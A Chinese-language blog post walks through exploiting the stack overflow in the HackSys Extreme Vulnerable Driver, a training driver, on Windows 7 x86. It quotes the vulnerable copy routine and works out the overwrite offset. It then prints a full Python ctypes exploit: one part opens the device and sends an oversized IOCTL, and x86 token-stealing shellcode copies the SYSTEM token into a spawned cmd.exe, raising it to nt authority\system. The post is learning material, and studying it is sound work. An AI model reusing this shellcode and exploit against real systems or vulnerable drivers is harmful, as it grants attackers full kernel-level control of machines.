---
layout: post
title:  "内核进击之旅--HEVD--stackoverflow"
date:   2018-03-27 07:00:00
categories: windows-kernel-exploit
permalink: /archivers/内核进击之旅--HEVD--stackoverflow
---
## HEVD
HEVD全称是HackSysExtremeVulnerableDriver，它是一个包含各种Windows内核漏洞的驱动程序项目，可以用来学习Windows内核攻击。地址是[https://github.com/hacksysteam/HackSysExtremeVulnerableDriver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)

## 前奏
首先需要编译驱动程序，在前一篇中[安装环境](https://ray-cp.github.io/archivers/内核进击之旅--安装调试环境)和编译已经描述清楚了。一开始我编译的平台是Win7x86。后面再介绍x64，二者相差不大。编译完成后，使用OSR driver Loader在目标系统中加载驱动，加载完成后开始分析。同时在windbg里执行`ed nt!Kd_Default_Mask 8`就可以修改注册表打开DbgPrint调试输出。

## 漏洞分析
第一个漏洞是stackoverflow，因为程序有源代码，所以我先直接看的源代码。可以看到`HACKSYS_EVD_IOCTL_STACK_OVERFLOW` IO code对应的是`StackOverflowIoctlHandler`例程函数。跟进去这个函数，发现它获取了用户的输入以及用户传入的输入大小并且调用`TriggerStackOverflow`函数，继续跟进，发现`TriggerStackOverflow`即是漏洞函数。
```C
        NTSTATUS Status = STATUS_SUCCESS;
        ULONG KernelBuffer[BUFFER_SIZE] = {0};
        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(KernelBuffer));

        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%X\n", sizeof(KernelBuffer));
        DbgPrint("[+] Triggering Stack Overflow\n");

        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
        // because the developer is passing the user supplied size directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of KernelBuffer
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
```
通过这个函数可以看到漏洞的成因是`KernelBuff`大小是固定的512*8字节，而在最后拷贝的时候却使用的是用户自定义的大小，导致存在溢出。

## 漏洞利用      
### BSOD
想要利用漏洞，首先能触发漏洞并引起`BSOD`，漏洞触发很简单，只要传入的`UserBuff`以及`Size`都大于`KernelBuff`即可。为了练习`Python`编程能力，使用`Python`的`ctypes`来写程序（其实主要是看别人的代码来改）。
把程序拖进IDA，看到`KernelBuff`的地址是`unsigned int KernelBuffer[512]; // [esp+Ch] [ebp-828h]`，所以传入的输入大于`0x828+4`即可覆盖`eip`导致异常崩溃。
首先是获取驱动句柄：
```PYTHON
def gethandle():
    """Open handle to driver and return it"""

    print "[*]Getting device handle..."
    lpFileName = u"\\\\.\\HacksysExtremeVulnerableDriver"
    dwDesiredAccess = GENERIC_READ | GENERIC_WRITE
    dwShareMode = 0
    lpSecurityAttributes = None
    dwCreationDisposition = OPEN_EXISTING
    dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
    hTemplateFile = None

    handle = CreateFileW(lpFileName,
                         dwDesiredAccess,
                         dwShareMode,
                         lpSecurityAttributes,
                         dwCreationDisposition,
                         dwFlagsAndAttributes,
                         hTemplateFile)
                         
    if not handle or handle == -1:
        print "\t[-]Error getting device handle: " + FormatError()
        sys.exit(-1)
        
    print "\t[+]Got device handle: 0x%x" % handle
    return handle
```
接下来是触发漏洞，触发漏洞首先需要IO code，IO code可以从IDA里面获取，也可以照着源码构造。HEVD的stackoverflow的IO code是`0x222003`。知道IO code以后就可以用`DeviceIoControl`来传递IO包去触发漏洞。
```PYTHON
def trigger(hDevice, dwIoControlCode):
    """Create evil buf and send IOCTL"""

    evilbuf = create_string_buffer("A"*0x828+'1'*4+'2'*4)
    lpInBuffer = addressof(evilbuf)
    nInBufferSize = 0x828+8
    lpOutBuffer = None
    nOutBufferSize = 0
    lpBytesReturned = None
    lpOverlapped = create_string_buffer("A"*8)

    pwnd = DeviceIoControl(hDevice,
                                           dwIoControlCode,
                                           lpInBuffer,
                                           nInBufferSize,
                                           lpOutBuffer,
                                           nOutBufferSize,
                                           lpBytesReturned,
                                           lpOverlapped)
    if not pwnd:
        print "\t[-]Error: Not pwnd :(\n" + FormatError()
        sys.exit(-1)
```
运行脚本，系统崩溃退出。在windbg里面，我们可以看到溢出崩溃后的情况。
```C
Win7_x86!IrpDeviceIoCtlHandler+b7 [c:\users\raycp\desktop\hacksysextremevulnerabledriver-master\driver\hacksysextremevulnerabledriver.c @ 208]
8e3dd4f7 8945f8          mov     dword ptr [ebp-8],eax

BUGCHECK_STR:  ACCESS_VIOLATION

EXECUTE_ADDRESS: 32323232

FAILED_INSTRUCTION_ADDRESS: 
+0
32323232 ??    
```
可以看到`eip`被覆盖成了`0x32323232`即输入字符串中的`'2'*4`

### shellcode
一开始学的shellcode就是替换cmd进程token为system的token，达到提权的目的。
为了获取token，需要对windows内核的结构体有些了解。
首先是获取Windows的`KPCR`（Kernel Processor Control Region）结构体，这个结构体存储了关于处理器的一些信息。在win7 x86系统中该结构体存储在`fs:[0]`，而在x64系统中，结构体存储在`gs:[0]`中。
```C
kd> dt nt!_KPCR
   +0x000 NtTib            : _NT_TIB
   +0x000 Used_ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Used_StackBase   : Ptr32 Void
   +0x008 Spare2           : Ptr32 Void
   +0x00c TssCopy          : Ptr32 Void
   +0x010 ContextSwitches  : Uint4B
   +0x014 SetMemberCopy    : Uint4B
   +0x018 Used_Self        : Ptr32 Void
   +0x01c SelfPcr          : Ptr32 _KPCR
   +0x020 Prcb             : Ptr32 _KPRCB
   ...
   +0x120 PrcbData         : _KPRCB
```
在`KPCR`偏移`0x120`的地方存储了`KPRCB`（ Kernel Processor Control Block）结构体，这个结构体存储了当前处理器的信息，包含线程信息等。
```C
kd> dt nt!_KPRCB
   +0x000 MinorVersion     : Uint2B
   +0x002 MajorVersion     : Uint2B
   +0x004 CurrentThread    : Ptr32 _KTHREAD
   +0x008 NextThread       : Ptr32 _KTHREAD
   +0x00c IdleThread       : Ptr32 _KTHREAD
   ...
```
在这里我们关心的是偏移`0x4`的`_KTHREAD`结构体，这个指针指向一个`ETHREAD`结构体，包含当前运行线程的信息。
```C
kd> dt nt!_KTHREAD
   +0x000 Header           : _DISPATCHER_HEADER
   +0x010 CycleTime        : Uint8B
   +0x018 HighCycleTime    : Uint4B
   +0x020 QuantumTarget    : Uint8B
   +0x028 InitialStack     : Ptr32 Void
   +0x02c StackLimit       : Ptr32 Void
   +0x030 KernelStack      : Ptr32 Void
   +0x034 ThreadLock       : Uint4B
   +0x038 WaitRegister     : _KWAIT_STATUS_REGISTER
   ...
   +0x040 ApcState         : _KAPC_STATE
   +0x040 ApcStateFill     : [23] UChar
   +0x057 Priority         : Char
   ...
```
在`_KTHREAD`偏移0x40的地方是`_KAPC_STATE`结构体。这个结构体比较简单：
```C
kd> dt nt!_KAPC_STATE
   +0x000 ApcListHead      : [2] _LIST_ENTRY
   +0x010 Process          : Ptr32 _KPROCESS
   +0x014 KernelApcInProgress : UChar
   +0x015 KernelApcPending : UChar
   +0x016 UserApcPending   : UChar
```
最终我们看到了`_KPROCESS`指针，这个指针指向`EPROCESS`，`EPROCESS`结构体包含了当前进程的一些信息。
```C
kd> dt nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x098 ProcessLock      : _EX_PUSH_LOCK
   +0x0a0 CreateTime       : _LARGE_INTEGER
   +0x0a8 ExitTime         : _LARGE_INTEGER
   +0x0b0 RundownProtect   : _EX_RUNDOWN_REF
   +0x0b4 UniqueProcessId  : Ptr32 Void
   +0x0b8 ActiveProcessLinks : _LIST_ENTRY
   +0x0c0 ProcessQuotaUsage : [2] Uint4B
   +0x0c8 ProcessQuotaPeak : [2] Uint4B
   +0x0d0 CommitCharge     : Uint4B
   +0x0d4 QuotaBlock       : Ptr32 _EPROCESS_QUOTA_BLOCK
   +0x0d8 CpuQuotaBlock    : Ptr32 _PS_CPU_QUOTA_BLOCK
   +0x0dc PeakVirtualSize  : Uint4B
   +0x0e0 VirtualSize      : Uint4B
   +0x0e4 SessionProcessLinks : _LIST_ENTRY
   +0x0ec DebugPort        : Ptr32 Void
   +0x0f0 ExceptionPortData : Ptr32 Void
   +0x0f0 ExceptionPortValue : Uint4B
   +0x0f0 ExceptionPortState : Pos 0, 3 Bits
   +0x0f4 ObjectTable      : Ptr32 _HANDLE_TABLE
   +0x0f8 Token            : _EX_FAST_REF
   +0x0fc WorkingSetPage   : Uint4B
   ...
```
这个结构体中需要关注的字段有三个，一个是`UniqueProcessId`，表示的是当前进程`ID`，即我们在任务管理器里面看到的进程号，我们要寻找的`system`的进程号是`4`。第二个是`Token`字段，我们所要做的即是将`system`的`token`拷贝至`cmd`的`token`字段中。最后一个是`ActiveProcessLinks`，这是一个双向链表，指向下一个进程的`ActiveProcessLinks`结构体处，通过这个链表我们可以遍历所有进程，以寻找我们需要的进程。

有了以上信息后，我们可以将shellcode的过程总结如下：
1. 获取`KTHREAD`以及`EPROCESS`指针
2. 遍历`ActiveProcessLinks`寻找`UniqueProcessId`为启动`cmd` id的`EPROCESS`结构体
3. 遍历`ActiveProcessLinks`寻找`UniqueProcessId`为4（`system`）的`EPROCESS`结构体
4. 拷贝`system`的`token`给`cmd`
5. 恢复驱动运行
代码如下
第一步，获取`KTHREAD`以及`EPROCESS`指针
```C
   mov eax, fs:[KTHREAD_OFFSET]
   mov eax, [eax + EPROCESS_OFFSET]
```
第二步，遍历`ActiveProcessLinks`寻找`UniqueProcessId`为启动`cmd` id的`EPROCESS`结构体
```C
   mov ecx, eax (Current _EPROCESS structure)
   mov ebx, [eax + TOKEN_OFFSET]
find_cmd_process
   mov edx,pid(CMD)
   mov ecx, [ecx + FLINK_OFFSET]
   sub ecx, FLINK_OFFSET           
   cmp [ecx + PID_OFFSET], edx     
   jnz find_cmd_process
```
第三步，遍历`ActiveProcessLinks`寻找`UniqueProcessId`为4（`system`）的`EPROCESS`结构体
```C
find_system_process
   mov edx, 4 (SYSTEM PID)
   mov eax, [eax + FLINK_OFFSET] 
   sub eax, FLINK_OFFSET          
   cmp [eax + PID_OFFSET], edx    
   jnz find_system_process
```
第四步，拷贝`system`的`token`给`cmd`
```C
;Copy System PID token
   mov edx, [eax + TOKEN_OFFSET]
   mov [ecx + TOKEN_OFFSET], edx
```
第五步，恢复驱动运行，在用户态中，在实现攻击目的后，一般我们可以不用管该程序能否正常运行，因为程序异常只是退出，不会影响整个系统的正常运行。但是在内核态中，如果我们在获取`toke`以后就不管了，该驱动仍然会运行错误，导致整个系统崩溃从而无法达到攻击目的，所以需要恢复该驱动的正常运行。我们可以往栈下方寻找，看到可以恢复到`IrpDeviceIoCtlHandler`中，即可让驱动正常运行。
```C
   add esp, 0x14
   pop ebp
   ret 8
```

### 利用
有了shellcode之后，考虑如何利用。包含以下步骤：
1. 启动一个cmd进程
2. 获取驱动句柄
3. 获取相应的IO code
4. 为shellcode分配内存
5. 创建一个字符串用于溢出驱动
6. 触发漏洞

第一步，创建cmd进程
```PYTHON
def procreate():
    """Spawn shell and return PID"""

    print "[*]Spawning shell..."
    lpApplicationName = u"c:\\windows\\system32\\cmd.exe" # Unicode
    lpCommandLine = u"c:\\windows\\system32\\cmd.exe" # Unicode
    lpProcessAttributes = None
    lpThreadAttributes = None
    bInheritHandles = 0
    dwCreationFlags = CREATE_NEW_CONSOLE
    lpEnvironment = None
    lpCurrentDirectory = None
    lpStartupInfo = STARTUPINFO()
    lpStartupInfo.cb = sizeof(lpStartupInfo)
    lpProcessInformation = PROCESS_INFORMATION()
    
    ret = CreateProcess(lpApplicationName,           # _In_opt_      LPCTSTR
                        lpCommandLine,               # _Inout_opt_   LPTSTR
                        lpProcessAttributes,         # _In_opt_      LPSECURITY_ATTRIBUTES
                        lpThreadAttributes,          # _In_opt_      LPSECURITY_ATTRIBUTES
                        bInheritHandles,             # _In_          BOOL
                        dwCreationFlags,             # _In_          DWORD
                        lpEnvironment,               # _In_opt_      LPVOID
                        lpCurrentDirectory,          # _In_opt_      LPCTSTR
                        byref(lpStartupInfo),        # _In_          LPSTARTUPINFO
                        byref(lpProcessInformation)) # _Out_         LPPROCESS_INFORMATION
    if not ret:
        print "\t[-]Error spawning shell: " + FormatError()
        sys.exit(-1)

    time.sleep(1) # Make sure cmd.exe spawns fully before shellcode executes

    print "\t[+]Spawned with PID: %d" % lpProcessInformation.dwProcessId
    return lpProcessInformation.dwProcessId
```
其中第二及第三步在`BSOD`部分已经说过，不再重复。

第四步，为shellcode分配内存。
```PYTHON
def shellcode(pid):
    """Craft our shellcode and stick it in a buffer"""

    tokenstealing = (
        #---[Setup]
        "\x60"                      # pushad
        "\x64\xA1\x24\x01\x00\x00"  # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"              # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                  # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00"  # mov ebx, [eax + TOKEN_OFFSET]
        #-- find cmd process"
        "\xBA"+ struct.pack("<I",pid) +  #mov edx,pid(CMD)
        "\x8B\x89\xB8\x00\x00\x00"  # mov ecx, [ecx + FLINK_OFFSET] <-|
        "\x81\xe9\xB8\x00\x00\x00"      # sub ecx, FLINK_OFFSET           |
        "\x39\x91\xB4\x00\x00\x00"  # cmp [ecx + PID_OFFSET], edx     |
        "\x75\xED"                  # jnz
        #---find system process"
        "\xBA\x04\x00\x00\x00"      # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"  # mov eax, [eax + FLINK_OFFSET] <-|
        "\x2D\xB8\x00\x00\x00"      # sub eax, FLINK_OFFSET           |
        "\x39\x90\xB4\x00\x00\x00"  # cmp [eax + PID_OFFSET], edx     |
        "\x75\xED"                  # jnz                           ->|
        #---[Copy System PID token]
        "\x8B\x90\xF8\x00\x00\x00"  # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"  # mov [ecx + TOKEN_OFFSET], edx
        #---[Recover]
        
        "\x61"                      # popad
        "\x31\xC0"                  # NTSTATUS -> STATUS_SUCCESS
        "\x83\xc4\x14"              # add esp, 0x14
        "\x5d"                      #pop ebp
        "\xC2\x08\x00"              # ret 8
        
        ""
    )
                                        #    ret

    print "[*]Allocating buffer for shellcode..."
    lpAddress = None
    dwSize = len(tokenstealing)
    flAllocationType = (MEM_COMMIT | MEM_RESERVE)
    flProtect = PAGE_EXECUTE_READWRITE
    
    addr = VirtualAlloc(lpAddress,         # _In_opt_  LPVOID
                        dwSize,            # _In_      SIZE_T
                        flAllocationType,  # _In_      DWORD
                        flProtect)         # _In_      DWORD
    if not addr:
        print "\t[-]Error allocating shellcode: " + FormatError()
        sys.exit(-1)

    print "\t[+]Shellcode buffer allocated at: 0x%x" % addr
    
    # put de shellcode in de buffer and shake it all up
    memmove(addr, tokenstealing, len(tokenstealing))
    return addr
```
第五步，创建一个字符串用于溢出驱动
```PYTHON
   inBuffer = create_string_buffer("A" * (0x828+4) + struct.pack("<I", scAddr))
```
第六步，触发漏洞。
```PYTHON
def trigger(hDevice, dwIoControlCode, scAddr):
    """Create evil buffer and send IOCTL"""

    inBuffer = create_string_buffer("A" * (0x828+4) + struct.pack("<I", scAddr))
    #evilbuf = create_string_buffer("A"*0x828+'1'*4+'2'*4)

    print "[*]Triggering vulnerable IOCTL..."
    lpInBuffer = addressof(inBuffer)
    nInBufferSize = len(inBuffer)-1 # ignore terminating \x00
    lpOutBuffer = None
    nOutBufferSize = 0
    lpBytesReturned = byref(c_ulong())
    lpOverlapped = None
    
    pwnd = DeviceIoControl(hDevice,             # _In_        HANDLE
                           dwIoControlCode,     # _In_        DWORD
                           lpInBuffer,          # _In_opt_    LPVOID
                           nInBufferSize,       # _In_        DWORD
                           lpOutBuffer,         # _Out_opt_   LPVOID
                           nOutBufferSize,      # _In_        DWORD
                           lpBytesReturned,     # _Out_opt_   LPDWORD
                           lpOverlapped)        # _Inout_opt_ LPOVERLAPPED
    if not pwnd:
        print "\t[-]Error: Not pwnd :(\n" + FormatError()
        sys.exit(-1)
```
最终在cmd中执行命令`whoami`可以看到已经是`system`用户。
```C
C:\Users\raycp\Desktop\hevd>whoami
nt authority\system
```

### x64平台
x64平台编译出来后，二者相差不大，要改变的主要是三个地方，一个是溢出字符串偏移有所改变，这个具体使用IDA查看就好。一个是shellcode结构体一开始寻找使用的是`gs:[0]`而不是`fs:[0]`这个在前面提过，shellcode的原理是一致的。最后一个是shellcode一开始需要将`rsi`寄存器设置为可读地址的区域，否则后面会报错，原因在于后面使用了`rsi`寄存器来访存。所以一开始要设置。具体可以看最后给的[exp](https://github.com/ray-cp/windows-kernel-exploit/tree/master/HEVD/StackOverflow)。
### 小结
刚开始调试内核，不懂得东西好多，还有很多的东西要学。脚踏实地，仰望星空。

### 链接
1. [HackSys Extreme Vulnerable Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)
2. [Kernel Hacking With HEVD Part 1 - The Setup](https://sizzop.github.io/2016/07/05/kernel-hacking-with-hevd-part-1.html)
3. [Windows Kernel Exploitation: Stack Overflow](https://osandamalith.com/2017/04/05/windows-kernel-exploitation-stack-overflow/)
4. [x64 Kernel Privilege Escalation](http://mcdermottcybersecurity.com/articles/x64-kernel-privilege-escalation)